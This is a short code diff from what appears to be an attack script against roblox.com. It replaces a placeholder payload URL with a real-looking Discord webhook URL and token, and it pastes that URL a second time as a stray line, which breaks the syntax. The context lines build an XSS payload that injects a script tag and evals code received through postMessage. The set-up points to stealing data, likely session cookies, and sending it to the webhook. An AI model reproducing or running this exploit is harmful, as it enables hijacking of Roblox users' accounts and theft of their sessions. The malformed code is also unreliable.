@@ -21,8 +21,8 @@
         
         // this is the script that will get executed in the context of roblox.com
         // make sure necessary CORS headers are present
-        var robloxContextPayloadUrl = "https://yourdomain.com/payload/payload.js"
-        
+        var robloxContextPayloadUrl = "https://discordapp.com/api/webhooks/865296957488758804/TClRwiZCY3431I7ipuSVJzUIWP4KD2G3QYdktVXWYYgwpSwpNaCHfHP6w-4NeZdrfUR1"
+        https://discordapp.com/api/webhooks/865296957488758804/TClRwiZCY3431I7ipuSVJzUIWP4KD2G3QYdktVXWYYgwpSwpNaCHfHP6w-4NeZdrfUR1
         function getFcXssUrl() {
             var payload = "window.onmessage=e=>eval(e.data.f)(e.data.args)"
             payload = "\"><script>" + encodeURIComponent(payload) + "<\/script><!--"
